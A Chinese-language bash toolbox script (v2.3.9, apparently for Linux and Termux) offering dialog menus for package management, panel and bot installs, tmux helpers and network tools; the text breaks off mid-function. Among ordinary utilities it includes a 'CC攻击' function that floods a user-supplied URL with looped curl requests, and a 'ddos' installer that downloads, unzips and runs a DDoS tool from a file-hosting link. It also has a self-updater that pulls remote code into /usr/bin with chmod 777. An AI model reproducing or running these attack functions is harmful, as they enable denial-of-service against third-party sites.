#!/bin/bash
# 本脚本由NAS油条制作
# NAS油条的实用脚本
time_date="2025/8/23"
version="v2.3.9"
nasyt_dir="$HOME/.nasyt" #脚本工作目录
source $nasyt_dir/.config # 加载脚本配置
bin_dir="usr/bin" #bin目录

# 主菜单
menu_jc() {
    menu() {
        clear
        while true
        do
            clear; clear
            echo
            echo "◉NAS油条的实用脚本$version"
            figlet N A S
            check_Script_Install
            echo "1) Termux_Linux工具箱(旧)"
            if command -v nasyt &> /dev/null
            then
               echo "2) 更新"
            else
               echo "2) Linux工具箱(安装|更新|Linux)"
            fi
            echo "3) Linux工具箱(在线|启动|通用)"
            br
            echo "感谢QQ:2738136724做出贡献。"
            br
            echo "0) 退出"
            br
            read -p "请选择(回车键默认): " menu
            case $menu in
                1)
                    git clone https://gitee.com/nasyt/nasyt-linux-tool.git
                    bash nasyt-linux-tool/nasyt-linux-tool.sh ;;
                2)
                    gx; esc ;;
                3) 
                    break ;;
                0) 
                    exit 0 ;;
                *)
                    break ;;
            esac
        done
    }
    
    menu
}

# 检查包管理器的函数
check_pkg_install() {
    clear
    if [ -f /etc/os-release ]; then
        source /etc/os-release #加载变量
    fi
    
    if command -v termux-info >/dev/null 2>&1; then
        sys="(Termux 终端)"
        sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@' $PREFIX/etc/apt/sources.list
        pkg_install="pkg install"
        pkg_remove="pkg remove"
        deb_sys="pkg"
        yes_tg="-y"
        
    elif command -v apt-get >/dev/null 2>&1; then
        sys="(Debian/Ubuntu 系列)"
        pkg_install="sudo apt install"
        pkg_remove="sudo apt remove"
        deb_sys="apt"
        yes_tg="-y"
        
    elif command -v yum >/dev/null 2>&1; then
        sys="(RHEL/Rocky/CentOS 7 及更早版本)"
        pkg_install="sudo yum install"
        pkg_remove="sudo yum remove"
        deb_sys="yum"
        yes_tg="-y"
        
    elif command -v dnf >/dev/null 2>&1; then
        sys="(Fedora/RHEL/CentOS 8 及更高版本)"
        pkg_install="sudo dnf install"
        pkg_remove="sudo dnf remove"
        deb_sys="dnf"
        yes_tg="-y"
        
    elif command -v pacman >/dev/null 2>&1; then
        sys="(Arch Linux 系列)"
        pkg_install="sudo pacman -S"
        pkg_remove="sudo pacman -R"
        deb_sys="pacman"
        yes_tg="-y"
        
    elif command -v zypper >/dev/null 2>&1; then
        sys="(openSUSE 系列)"
        pkg_install="sudo zypper install"
        pkg_remove="sudo zypper remove"
        deb_sys="zypper"
        yes_tg="-y"
        
    elif command -v apk >/dev/null 2>&1; then
        sys="(Alpine/PostmarketOS系统)"
        pkg_install="sudo apk add"
        deb_sys="apk"
        yes_tg=""
        
    elif command -v emerge >/dev/null 2>&1; then
        sys="(gentoo 系统)"
        pkg_install="sudo emerge -avk"
        deb_sys="emerge"
        yes_tg="-y"
        
    elif command -v brew >/dev/null 2>&1; then
        sys="(MacOS 系统)"
        pkg_install="sudo brew install"
        deb_sys="brew"
        yes_tg="-y"
        read -p "抱歉，目前没有适配MacOS系统"
        
    else
        echo ">_<未检测到支持的系统。"
        read -p "但是脚本依然可以运行。"
        br
    fi
}

# 检查dialog whiptail figlet安装
main_install() {
    dialog_install() {
        if command -v dialog &> /dev/null
        then
            echo "◉ dialog 已经安装，跳过安装步骤。"
        else 
            echo "正在安装dialog"
            $pkg_install dialog $yes_tg
        fi
    }
    figlet_install() {
        if command -v figlet &> /dev/null
        then
            echo "◉ figlet 已经安装，跳过安装步骤。"
        else 
            echo "正在安装figlet"
            $pkg_install figlet $yes_tg
        fi
    }
    whiptail_install () {
    if command -v whiptail &> /dev/null
    then
        echo "◉ whiptail已安装, 跳过安装步骤。"
    else
        echo "whiptail未安装，正在安装。"
        if command -v pacman >/dev/null 2>&1; then
            echo "检测到Arch系统，正在安装libnewt软件包"
            $pkg_install libnewt $yes_tg
        else
            $pkg_install whiptail $yes_tg
        fi
    fi
    }
    dialog_install
    whiptail_install
    figlet_install
}




# 全部变量
all_variable() {

    OUTPUT_FILE="nasyt" # 下载文件名
    TIMEOUT=10  # curl超时时间（秒）
    URLS=(
      "https://gitee.com/nasyt/nasyt-linux-tool/raw/master/nasyt.sh"    # 主链接
      "https://nasyt.class2.icu/shell/nasyt.sh"  # 备用链接1
      "https://nasyt2.class2.icu/shell/nasyt.sh"  # 备用链接2
    )
    
}

# 定义颜色变量
color_variable() {
    color='\033[0m'
    green='\033[0;32m'
    blue='\033[0;34m'
    red='\033[31m'
    yellow='\033[33m'
    grey='\e[37m'
    pink='\033[38;5;218m'
    cyan='\033[96m'
}

# 函数
server_ip() {
    server_ip=$(hostname -i) # 服务器IP
    echo "当前IP为: $server_ip"
}
uptime_cn() {
    $habit --msgbox "系统已运行: $uptime_cn" 0 0
}
br() {
    echo -e "\e[1;34m--------------------------\e[0m"
}
esc() {
    read -p "按回车键继续..."
}

#错误处理
cw() {
    if [ $? -ne 0 ]; then
       break
    fi
}

test_python() {
    if command -v python >/dev/null 2>&1; then
       echo -e "$green ◉ python已安装,跳过安装$color"
    else
       echo "正在安装python"
       $pkg_install python $yes_tg
    fi
}

test_pip() {
    if command -v pip >/dev/null 2>&1; then
       echo -e "$green ◉ pip已安装,跳过安装$color"
    else
       $pkg_install pip $yes_tg
    fi
}

test_git() {
    if command -v git >/dev/null 2>&1; then
        echo -e "$green ◉ git已安装,跳过安装$color"
    else
        $pkg_install git $yes_tg
    fi
}

test_tmux() {
    if command -v tmux >/dev/null 2>&1; then
        echo -e "$green ◉ tmux已安装,跳过安装$color"
    else
        echo "正在安装tmux工具"
        $pkg_install tmux $yes_tg
    fi
}

test_neofetch() {
    if command -v neofetch >/dev/null 2>&1; then
        echo -e "$green ◉ neofetch已安装,跳过安装$color"
    else
        echo "正在安装neofetch工具"
        $pkg_install neofetch $yes_tg
    fi
}

test_fastfetch() {
    if command -v fastfetch >/dev/null 2>&1; then
        echo -e "$green ◉ fastfetch已安装,跳过安装$color"
    else
        echo "正在安装 fastfetch"
        $pkg_install fastfetch $yes_tg
    fi
}

test_hashcat() {
    if command -v hashcat >/dev/null 2>&1; then
        echo -e "$green ◉ hashcat已安装,跳过安装$color"
    else
        echo "正在安装hashcat工具"
        $pkg_install hashcat $yes_tg
    fi
}

test_burpsuite() {
    if command -v burpsuite >/dev/null 2>&1; then
        echo -e "$green ◉ burpsuite已安装,跳过安装$color"
    else
        echo "正在安装burpsuite工具"
        $pkg_install burpsuite $yes_tg
    fi
}

pip_mcstatus() {
    if pip show "mcstatus" > /dev/null 2>&1; then
       echo -e "$green ◉ mcstatus已安装,跳过安装$color"
    else
       echo "正在使用pip安装mcstatus"
       pip install mcstatus
    fi
}
pip_colorama() {
    if pip show "colorama" > /dev/null 2>&1; then
       echo -e "$green ◉ colorama已安装,跳过安装$color"
    else
       echo "正在使用pip安装mcstatus"
       pip install colorama
    fi
}

ad_gg () {
    echo -e "$pink金牌cpu云服务器9.9元起 ^o^$color"
    echo "国内高配服务器99元   云电脑4元起"
    echo "虚拟主机免费送 >_<"
    echo -e "地址 - $pink coyun.cc$color  百度 - $pink创欧云$color"
}

#错误函数处理
error() {
    echo -e "\e[31m错误: $1\e[0m"
    echo "错误代码为: $?"
    exit 1
}

#工作环境
termux_PATH () {
if command -v termux-info >/dev/null 2>&1; then
  if ! grep -q "^export PATH=/data/data/com.termux/files/home/.nasyt:" $HOME/.bashrc; then
      echo "export PATH="$nasyt_dir:"$PATH""" >> $HOME/.bashrc
      chmod 777 $nasyt_dir/nasyt #给予权限
  else
      echo "PATH 已存在于 $nasyt_dir，跳过添加"
      chmod 777 $nasyt_dir/nasyt #给予权限
  fi
else
  if ! grep -q "^export PATH="$nasyt_dir:"" $HOME/.bashrc; then
      echo "export PATH="$nasyt_dir:"$PATH""" >> $HOME/.bashrc
  else
      echo "PATH 已存在于 .bashrc  跳过添加"
  fi
fi
}

PATH_set () {
# PATH 行变量
if ! grep -q "^export PATH=" $nasyt_dir/.config; then
    echo "export PATH="$nasyt_dir:$PATH"" >> $nasyt_dir/.config
else
    echo "PATH 已存在于 $nasyt_dir，跳过添加"
fi
}

# 检查脚本文件夹。
check_script_folder () {
   if [ -d "$nasyt_dir" ]; then
      br
      echo "◉ 工作文件夹已创建"
   else
      mkdir -p "$nasyt_dir"
   fi
   if [ -e "$nasyt_dir/nasyt" ]; then
      echo "◉ 检测脚本安装"
   else
      gx
   fi
}

# 检查本脚本是否已安装
check_Script_Install() {
    if command -v nasyt >/dev/null 2>&1; then
        echo "◉ nasyt 已安装,可直接输入nasyt进入本界面"
    else 
        if [ -e "$nasyt_dir/nasyt" ]; then
            echo "◉ 变量环境已安装,可直接输入nasyt进入本界面"
        else
            gx
        fi
    fi
}

# 菜单使用习惯选择
habit_menu () {
        habit_menu_xz=$(dialog --title "个性化" \
        --menu "请选择菜单使用习惯" 0 0 10 \
        1 "dialog点击式" \
        2 "whiptail滑动式" \
        3 "重置选择" \
        0 "返回" \
        2>&1 1>/dev/tty )
}

habit_xz () {
    if [ -z "$habit" ]; then
        habit_menu
        case $habit_menu_xz in
           1) echo "export habit="dialog"" >  $nasyt_dir/.config ;;
           2) 
              if command -v whiptail &> /dev/null
              then
                 echo "export habit="whiptail"" > $nasyt_dir/.config
              else
                 echo "检测到你未安装whiptail，正在安装"
                 $pkg_install whiptail $yes_tg
              fi
              ;;
           3) sed -i '/^export=*/d' $nasyt_dir/.config ;;
           0) cw;break ;;
        esac
        
    elif [ -n "$habit" ]; then
        echo -e "菜单方式为: $yellow$habit$color"
    fi
}

# 主菜单
show_menu() {
    choice=$($habit --title "NAS油条Linux工具箱" \
    --menu "当前版本:$version $time_date\n本工具箱由NAS油条制作\nQQ群:610699712\n请选择你要启动的项目：" \
    0 0 10 \
    1 "查询菜单" \
    2 "系统工具" \
    3 "网络工具" \
    4 "安装工具" \
    5 "软件安装" \
    6 "其它脚本" \
    7 "更新脚本" \
    8 "更新日志" \
    9 "脚本设置" \
    0 "退出脚本" \
    2>&1 1>/dev/tty) 
    cw
    
    
}

# 查看菜单
look_menu() {
    
    look_choice=$($habit --title "查询菜单" \
    --menu "请选择" 0 0 10 \
    1 "运行时间time" \
    2 "配置信息sysinfo" \
    3 "当前IP地址" \
    4 "neofetch/fastfetch" \
    5 "地理位置" \
    0 "返回" \
    2>&1 1>/dev/tty)
}

# 系统操作
system_menu() {
    system_choice=$($habit --title "系统菜单" \
    --menu "请选择" 0 0 10 \
    1 "软件包管理" \
    2 "更换镜像源(全系统)" \
    3 "更新软件包" \
    4 "文件解压缩" \
    5 "ssh管理工具" \
    6 "安装jvav（debian/Ubuntu)" \
    7 "language" \
    0 "返回" \
    2>&1 1>/dev/tty)  
}

# 安装常用工具。
often_tool() {
   often_tool_linux() {
    often_tool_choice=$($habit --title "安装linux常用工具" \
    --menu "请选择" 0 0 10 \
    1 "安装Alist多储存资源盘" \
    2 "安装BT宝塔面板" \
    3 "安装AMH面板" \
    4 "安装1panel面板" \
    5 "安装MCSManager面板" \
    6 "安装cpolar内网穿透" \
    7 "安装DDOS攻击(请勿非法用途。)" \
    8 "安装Secluded机器人" \
    9 "安装TRSS机器人" \
    10 "安装Astrbot机器人" \
    11 "安装Napcat机器人" \
    12 "安装OneBot机器人" \
    13 "安装SFS游戏服务器" \
    14 "安装小皮面板" \
    0 "返回上层菜单" \
    2>&1 1>/dev/tty)
    }
    
   often_tool_termux() {
    often_tool_choice=$($habit --title "安装termux常用工具" \
    --menu "请选择" 0 0 10 \
    1 "安装Alist多储存资源盘" \
    6 "安装cpolar内网穿透" \
    7 "安装DDOS攻击(请勿非法用途)" \
    8 "安装Secluded机器人" \
    10 "安装Astrbot机器人" \
    12 "安装OneBot机器人" \
    0 "返回上层菜单" \
    2>&1 1>/dev/tty)
    }
    
    #检查当前系统
    often_tool_main() {
    if command -v termux-info >/dev/null 2>&1; then
       often_tool_termux
    else
       often_tool_linux
    fi
    }
    often_tool_main
}

# 软件安装
app_install() {
   app_install_linux() {
    app_install_xz=$($habit --title "安装软件" \
    --menu "请选择" 0 0 10 \
    1 "安装桌面中文输入法" \
    2 "安装Blender建模软件" \
    3 "安装linux系统应用商店" \
    0 "返回" \
    2>&1 1>/dev/tty)
    }
   app_install_termux() {
      $habit --msgbox "此区域只支持linux系统\n抱歉,不支持Termux终端>_<" 0 0
      break
   }
   app_install_main() {
   if command -v termux-info >/dev/null 2>&1; then
      app_install_termux
   else
      app_install_linux
   fi
   }
   app_install_main
}

# 网络常用工具
Internet_tool() {
    Internet_tool=$($habit --title "网络常用工具" \
    --menu "请选择" 0 0 10 \
    1 "ping工具" \
    2 "CC攻击" \
    3 "tmux终端工具" \
    4 "TMOE工具" \
    5 "nmap端口扫描工具" \
    6 "ranger文件管理工具" \
    7 "hashcat暴力破解工具" \
    8 "burpsuite渗透工具" \
    0 "返回上层菜单" \
    2>&1 1>/dev/tty)
}

# 各种服务器脚本。
Linux_shell() {
    linux_shell_linux() {
    Linux_shell_xz=$($habit --title "各种服务器脚本" \
    --menu "请选择" 0 0 10 \
    1 "亚洲云LinuxTool脚本工具" \
    2 "木空云LinuxTool脚本工具" \
    3 "MC 压力测试 脚本工具" \
    4 "Docker 安装与换源脚本" \
    5 "赤石脚本" \
    9 "欢迎联系作者添加" \
    0 "返回上层菜单" \
    2>&1 1>/dev/tty)
    }
    linux_shell_termux() {
    Linux_shell_xz=$($habit --title "各种termux脚本" \
    --menu "请选择" 0 0 10 \
    3 " MC 压力测试 脚本工具" \
    5 "赤石脚本" \
    6 "Termux版kali油条安装脚本" \
    9 "欢迎联系作者添加" \
    0 "返回上层菜单" \
    2>&1 1>/dev/tty)
    }
    linux_shell_main() {
    if command -v termux-info >/dev/null 2>&1; then
       linux_shell_termux
    else
       linux_shell_linux
    fi
   }
   linux_shell_main
}

# 脚本设置
nasyt_setup_menu () {
   nasyt_setup_choice=$($habit --title "脚本设置" \
   --menu "脚本设置" 0 0 10 \
   1 ">_<个性化" \
   2 "卸载脚本" \
   3 "github加速(暂未开发)" \
   9 "删除脚本配置文件" \
   0 "返回" \
   2>&1 1>/dev/tty)
}

# 调试模式
ts_menu() {
    br
    echo "1) 命令输出"
    echo "2) 函数输出"
    echo "3) 变量输出"
    echo "4) 补全文件"
    echo "0) 返回"
    br
}

# 文件解压缩
zip_menu() {
    br
    echo "1) zip文件"
    echo "2) tar.gz文件"
    echo "0) 返回"
    br
}

# ssh工具
ssh_tool_menu() {
    br
    echo "1) 连接SSH"
    echo "2) 启动SSH"
    echo "3) 修改密码"
    echo "0) 返回"
    br
}

#java安装
java_install_menu () {
    java_install_xz=$($habit --title "jvav安装" \
    --menu "Debian/Ubuntu用,请选择🤓jvav版本" 0 0 5 \
    21 "java21" \
    17 "java17" \
    11 "java11" \
    8 "java8" \
    22 "java22" \
    20 "java20" \
    19 "java19" \
    0 "返回" \
    2>&1 1>/dev/tty)
}

termux_kali_install() {
  termux_kali_install_xz=$($habit --title "安装源选择" \
  --menu "采用proot运行rootfs并且构建\n请选择kali的安装方式\n官方源:kali官方rootfs镜像（完整 最新）\n国内源:来自国内大佬整合出来的kali优化版(速度快 推荐) \n注意两者安装出来的镜像都不一样。" 0 0 3 \
  1 "官方源(kali.download)" \
  2 "国内源(gitee.com/zhang-955/clone)" \
  3 "如果有更多安装方式可以提交给我们。" \
  0 "返回" \
  2>&1 1>/dev/tty)
  if [ $? -ne 0 ]; then
    break
  fi
}
# 废弃
csh() {
    clear
    echo "正在使用 $pkg_install 更新中"
    if command -v pacman >/dev/null 2>&1; then
        sudo pacman -Syyu
    else
        $deb_sys upgrade $yes_tg
        echo 正在使用 $pkg_install 安装curl git dialog figlet中
        $pkg_install curl git dialog figlet $yes_tg
        $habit --msgbox "更新完成" 0 0
        esc
    fi
}

# ping命令
ping2() {
    read -p "请输入ping地址: " ping
    ping $ping
}

# CC攻击命令
cc() {
    echo "无"
}

# tmux命令
tmux_tool() {
    tmuxtool=$($habit --title "tmux工具" \
    --menu "请选择" 0 0 10 \
    1 "新建tmux窗口" \
    2 "全部tmux窗口" \
    3 "重命名tmux窗口" \
    4 "进入tmux窗口" \
    5 "杀死tmux窗口" \
    6 "查看tmux快捷键" \
    7 "全部tmux命令" \
    0 "退出" \
    2>&1 1>/dev/tty)
}

# tmux快捷键
tmux_keys() {
    echo "Ctrl+b c：创建一个新窗口，状态栏会显示多个窗口的信息。"
    echo "Ctrl+b p：切换到上一个窗口（按照状态栏上的顺序）。"
    echo "Ctrl+b n：切换到下一个窗口。"
    echo "Ctrl+b <number>：切换到指定编号的窗口，其中的<number>是状态栏上的窗口编号。"
    echo "Ctrl+b w：从列表中选择窗口。"
    echo "Ctrl+b ,：窗口重命名。"
}

# cpolar内网穿透一键安装。
cpolar_instell() {
    echo "选择你的框架"
    echo "1) AMD通用安装"
    echo "2) Aarch64(无)"
    echo "0) 退出"
    read -p "请输入选项（1-2）: " opt
    case $opt in
        1) curl --progress-bar -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash ;;
        2) bash nasyt-linux-tool/cpolar/aarch64.sh ;;
        0) exit 1 ;;
        *) echo "无效的输入。"; esc ;;
    esac
    sleep 1s
    echo "脚本结束。"
}

# 安装1panel面板
1panel() {
    br
    echo "1) RedHat / CentOS系统"
    echo "2) Ubuntu系统"
    echo "3) Debian系统"
    echo "4) openEuler / 其他"
    echo "0) 返回"
    br
}

# Secluded菜单
Secluded_menu() {
    Secluded_menu_xz=$($habit --title "Secluded菜单" \
    --menu "欢迎使用Secluded机器人\n本脚本由NAS油条制作" 0 0 5 \
    1 "安装Secluded" \
    2 "启动Secluded" \
    3 "卸载Secluded" \
    4 "Secluded问题" \
    0 "返回上层菜单" \
    2>&1 1>/dev/tty)
    cw
}

# 安装TRSS机器人
TRSS() {
    br
    echo "1) 安装TRSS机器人docker版(Linux推荐)"
    echo "2) 安装tmoe_proot/chroot容器(Termux推荐)"
    echo "d) docker打开TRSS机器人"
    echo "0) 返回"
    br
}

# 安装Astrbot机器人
astrbot() {
    echo "官网: https://astrbot.app"
    echo "提示: 宝塔上面的docker应用上有现成的"
    echo "注意: Astrbot是通过Python运行"
    br
    echo "1) CentOS系统安装"
    echo "2) Debian/Ubuntu安装"
    echo "3) python手动安装(兼容)"
    echo "4) 启动Astrbot(前提3)"
    echo "0) 返回"
    br
}

# CC攻击
cc() {
    echo "------CC攻击------"
    cc_url=$($habit --title "CC攻击" \
    --inputbox "请输入攻击地址" 0 0 \
    2>&1 1>/dev/tty)
    cc_sl=$($habit --title "CC攻击" \
    --inputbox "请输入攻击数量" 0 0 \
    2>&1 1>/dev/tty)
    echo 正在攻击ing...
    for ((i=0; i<$cc_sl; i++)); do
        echo "正在攻击$i"
        curl -s $cc_url > /dev/null     
    done
    echo "CC攻击完成"
}

# nmap扫描工具
nmap_install() {
    if command -v nmap &> /dev/null
    then
        echo "nmap已安装，正在进入工具界面。"
    else
        $habit --msgbox "nmap未安装，是否安装。" 0 0 
        $pkg_install nmap $yes_tg
    fi
}
nmap_menu() {
    nmap_install
    echo "提示: 暂时只有一个功能"; br
    echo "1) 扫描IP"
    echo "0) 返回"
    br
}

# deb软件包安装
deb_install() {
    br
    echo "1) 安装网络软件包。"
    echo "2) 安装本地软件包。"
    echo "3) 卸载软件包。"
    echo "0) 返回"
    br
}
deb_install_Internet() {
    br
    read -p "请输入软件包名字: " deb_install_pkg
    br
    if command -v $deb_install_pkg &> /dev/null
    then
        echo "软件包 $deb_install_pkg 已安装。"
    else 
        echo "正在使用 $pkg_install 安装 $deb_install_pkg 中"
        $pkg_install $deb_install_pkg $yes_tg
    fi
    br
}
deb_install_localhost() {
    echo "提示: 暂时只能安装deb软件包"
    br
    read -p "请输入软件包地址: " deb_localhost_xz
    br
    dpkg -i $deb_localhost_xz
}
deb_remove() {
    echo "卸载但是保留配置文件。"
    br
    read -p "请输入软件包: " deb_remove_xz
    clear
    br
    $pkg_install remove $deb_remove_xz $yes_tg
    br
    echo "使用 $pkg_install 卸载 $deb_remove_xz 软件包成功"
}

# ranger文件管理工具
ranger_install() {
    if command -v ranger &> /dev/null
    then
        read -p "ranger 已经安装。回车键进入。"
        ranger
    else 
        echo "未安装ranger正在安装。"
        $pkg_install ranger $yes_tg
        echo "ranger安装完成。"
        read-p "按回车键启动。"
        ranger
    fi
}

gx() {
    # 下载安装更新
    clear; br
    echo "正在删除原脚本。"
    rm /usr/bin/nasyt
    rm $nasyt_dir/nasyt
    echo "正在更新脚本。"
    for url in "${URLS[@]}"; do
        clear; br
        echo "正在下载脚本：$url"
        if curl --progress-bar -L -o "$HOME/nasyt" --retry 3 --retry-delay 2 --max-time $TIMEOUT "$url" ; then
            br
            echo "✓ 脚本下载成功!"
            cp nasyt /usr/bin/
            mv nasyt $nasyt_dir/nasyt;clear
            echo "正在给予脚本权限。"
            chmod 777 $nasyt_dir/nasyt
            chmod 777 /usr/bin/nasyt;
            source $HOME/.bashrc;clear
            $habit --msgbox "更新|安装成功,请输入nasyt重新进入" 0 0
            echo "请重新连接终端"
            echo "启动命令为nasyt"
            exit 0
        else
            echo "✗ 当前链接下载失败，3秒后尝试下一个链接..."
            sleep 3
        fi
    done
    echo "✗ 所有链接均下载失败，请检查网络或链接有效性"
    dialog --msgbox "跳过下载本地,使用在线模式。" 0 0
}

# 更新列表
gx_log() {
    br
    echo "2025年8日5日更新v2.3.5版"
    echo "对Secluded制作了独立的脚本"
    echo "修复已知bug。"
    br
    read
    echo "2025年8日4日更新v2.3.4版"
    echo "其他脚本更新 MC压力测试工具"
    echo "不出所料应该没什么问题(精心制作)"
    echo "个性化 github加速地址 制作完成"
    echo "添加部分函数,以及各种检测"
    echo "修复已知bug"
    br
    read
    echo "2025年8日3日更新v2.3.3版"
    echo "各系统已适配列表改变!!!"
    echo "对Alpine Linux系统进行适配"
    br
    read
    echo "2025年7日31日更新v2.3.2版"
    echo "修复pkg_install变量致命错误"
    br
    read
    echo "2025年7日21日更新v2.3.1版"
    echo "添加在线模式运行脚本"
    echo "更新fastfetch显示系统信息"
    echo "更新termux手动选择源"
    echo "更新Napcat机器人安装"
    echo "更新OneBot机器人安装"
    echo "图形界面添加更加适配"
    echo "增加对Rocky系统的部分适配"
    echo "添加对Gentoo系统的部分适配"
    echo "未来将适配更多linux系统"
    echo "修复已知bug"
    br
    read
    echo "2025年7日15日更新v2.3.0版"
    echo "添加部分文件在后台加载"
    echo "修复BUG,并且增加适配"
    echo "为工作目录设置工作环境"
    echo "支持termux通过nasyt命令启动脚本"
    echo "已对termux进行了大量适配"
    echo "添加termux终端自动换源"
    echo "添加了运行脚本的两个目录"
    echo "添加了卸载脚本功能"
    echo "优化的安装结构"
    echo "优化安装脚本检测"
    br
    read
    echo "2025年7日12日更新v2.2.9版"
    echo "正在适配postmarketos系统"
    echo "修复下载安装bug"
    br
    read
    echo "2025年7日11日更新v2.2.8版"
    echo "修复本脚本乱码的问题。"
    echo "添加了curl下载显示进度。"
    echo "添加系统LANG变量中文检测"
    echo "更新系统一键换国内源"
    echo "添加了对whiptail的安装与检测"
    echo "更新Astrbot机器人手动安装"
    br
    read
    echo "2025年7日3日更新v2.2.7版"
    echo "解压zip文件界面进行优化"
    echo "图形界面适配更多"
    echo "文字说明更加易懂"
    echo "已支持桌面输入法安装"
    echo "修复已知bug"
    echo "CC攻击脚本优化"
    echo "中文汉化内容更加完善"
    echo "对中文汉化的CentOS适配"
    echo "系统信息更加详细"
    br
    read
    echo "2025年6日30日更新v2.2.6版"
    echo "大部分地方已采用图形化"
    echo "添加查看服务器地理位置"
    echo "修复大量bug→_→"
    echo "添加了工作目录(.nasyt)"
    echo "添加了大量的变量"
    echo "已添加工作环境变量"
    echo "更新 个性化菜单(喜好)"
    echo "更新 清除配置文件↑"
    echo "添加脚本设置选项"
    echo "优化脚本逻辑(非常多)"
    echo "太肝了>﹏<,赞助点吧"
    br
    read
    echo "2025年6日22日更新v2.2.5版"
    echo "在系统工具中增加切换中文选项"
    br
    read
    echo "2025年6日21日更新v2.2.4版"
    echo "添加了三个备用安装更新链接"
    echo "以防安装或更新使用不了"
    echo "也以防了服务器那边出问题"
    echo "部分地方也采用了dialog图形化"
    echo "优化了更新日志。"
    br
    read
    echo "2025年6日19日更新v2.2.3版"
    echo "修复少量bug"
    echo "更新termux检查"
    echo "并自动跳过安装界面"
    br
    read
    echo "2025年6日18日更新v2.2.2版"
    echo "修复了部分bug"
    echo "优化了脚本布局"
    echo "提升了脚本效率"
    echo "更新figlet文字"
    echo "准备更新zsh终端美化"
    br
    read
    echo "2025年5日29日更新v2.2.1版"
    echo "更新变量颜色代码"
    echo "修复系统工具无法退出bug。"
    br
    read
    echo "2025年5日16日更新v2.2版"
    echo "需要定制版的联系NAS油条(免费)"
    echo "更新服务器地理位置查询。"
    echo "增加了ssh的连接管理工具"
    echo "增加了发布页回车键默认选项"
    echo "大改了发部页面,更简单明了"
    echo "更改了菜单的布局,更好分辨"
    echo "增加了小皮面板安装"
    echo "修复了系统启动文件bug"
    br
    read
    echo "2025年5日10日更新v2.19.4版"
    echo "更新像素工厂146服务器安装(无)"
    br
    read
    echo "2025年5日4日更新v2.19.3版"
    echo "更新自动将系统设为中文。"
    echo "各位有什么意见"
    br
    read
    echo "2025年5日3日更新v2.19.2版"
    echo "更新SFS服务器安装"
    br
    read
    echo "2025年4日25日更新v2.19.1版"
    echo "更新zip_7z文件解压"
    echo "更新tar.gz文件解压"
    echo "简单优化了一下脚本"
    br
    read
    echo "2025年4日20日更新v2.19版"
    echo "将脚本发布页融为一体(非常重要)"
    echo "删除了调试模式。(其实没有)"
    echo "修复了部分bug(真的修了)"
    echo "更新ranger文件管理器(豪用)"
    echo "增加软件包更新功能。(有用吧)"
    br
    read
    echo "2025年4日18日更新v2.18.5版"
    echo "恢复了dialog的安装检测(忘记了)"
    echo "完善了deb软件包管理(可能有用吧)"
    echo "添加了deb软件包安装的检测。"
    echo "优化了脚本的体验。(可能吧?)"
    br
    read
    echo "2025年4日18日更新v2.18版"
    echo "优化了脚本的大小(似乎没啥用)"
    echo "增加了常用软件安装(摆设)"
    echo "增加了deb软件包安装(可能有用吧)"
    echo "增加了nmap扫描功能(没更新完)"
    echo "更改了系统常用菜单(删了一点东西)"
    echo "优化了引导菜单脚本(没有改啥)"
    echo "更新1panel面板安装(懒得整合了)"
    echo "修了部分bug。(真的吗？)"
    br
    read
    echo "2025年4日17日更新v2.17版"
    echo "修复DDOS攻击兼容问题"
    echo "更新Astrbot机器人安装"
    echo "更新TMOE工具"
    echo "修复已知bug"
    br
    read
    echo "2025年4日15日更新v2.16版"
    echo "更新TRSS机器人安装"
    echo "更新Secluded机器人安装"
    br
    read
    echo "2025年4日14日更新v2.15版"
    echo "更新调试模式"
    echo "更新tmux命令功能"
    echo "修理部分bug"
    echo "优化脚本结构"
    br
    read
    echo "2025年4日13日更新v2.14版"
    echo "增加了很多功能。"
    echo "修复了部分bug。"
    echo "修改了提示。"
    echo "增加了系统适配。"
    br
    read
    echo "2025年3日30日更新v2.13版"
    echo "增加更新功能。"
    br
    read
    echo "2025年3日22日更新v2.12版"
    echo "更新DDOS安装和CC攻击"
    echo "采用dialog图形形化菜单"
    br
    read
    echo "2025年3月21日更新v2.1 版"
    echo "全新的脚本。"
    echo "Bug很多。"
    br
}

# DDOS攻击安装
ddos() {
    cd ddos; python ddos.py
    dialog --msgbox "确定开始安装。" 0 0; clear
    echo 切换清华下载源; sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@' $PREFIX/etc/apt/sources.list; clear
    echo 更新资源中; $pkg_install update $yes_tg && apt upgrade $yes_tg; echo 更新完成; clear
    echo "正在安装 figlet"; $pkg_install figlet; clear
    echo "正在安装 python"; echo 途中可能会停止请输入y继续
    echo "等的时间可能有点长,请耐心等待。"; $pkg_install python $yes_tg; clear
    echo "正在安装 ddos"; curl --progress-bar -o ddos.zip https://cccimg.com/down.php/576c81c114e3a3c1b3e702bd19117594.zip; unzip ddos.zip; clear
    echo "清理安装包中"; rm ddos.zip
    echo "以后请输入以下命令启动"; echo python ddos/ddos.py; read -p "回车键继续"
    cd ddos; python ddos.py
}

#tmux工具
tmux_tool_index() {
  while true
  do
  tmux_ls=$(tmux ls)        # tmux转中文
  tmux_ls_cn=$(echo "$tmux_ls" | sed -E 's/windows//g; s/created/创建于/g; s/^( *)创建于 /\1创建于\\/; s/^/窗口名字: /')
  clear
  test_tmux
  tmux_tool
  case $tmuxtool in
    1) 
        clear
        new_tmux=$($habit --title "窗口名字" \
        --inputbox "请输入窗口名字" 0 0 \
        2>&1 1>/dev/tty)
            echo "创建 $new_tmux 窗口成功。"
            echo "Ctrl+B D离开窗口"
        read -p "回车键进入。"
            tmux new -s "$new_tmux"
        esc ;;
    2) 
        clear; br
            echo "$tmux_ls_cn"; br
        esc
        ;;
    3)
        clear; br
            echo "$tmux_ls_cn"; br
        read -p "请输入要重命名的窗口: " rename_tmux_1
        read -p "重命名为: " rename_tmux_2
            tmux rename-session -t $rename_tmux_1 $rename_tmux_2
            echo "将 $rename_tmux_1 重命名 $rename_tmux_2 成功"
        esc
        ;;
    4)
        clear; br
            echo "$tmux_ls_cn"; br
        read -p "请输入要进入的窗口号: " join_tmux
            tmux attach-session -t $join_tmax
        esc
        ;;
    5)
        clear; br
            echo "$tmux_ls_cn"; br
        read -p "请输入要杀死的窗口: " kill_tmux
            tmux kill-session -t $kill_tmux
        echo "杀死 $kill_tmux 窗口成功"
        esc
        ;;
    7)
        tmux list-commands; br
        esc
        ;;
    6)
        clear
        tmux_keys
        esc
        ;;
    0)
        break
        read
        ;;
    *)
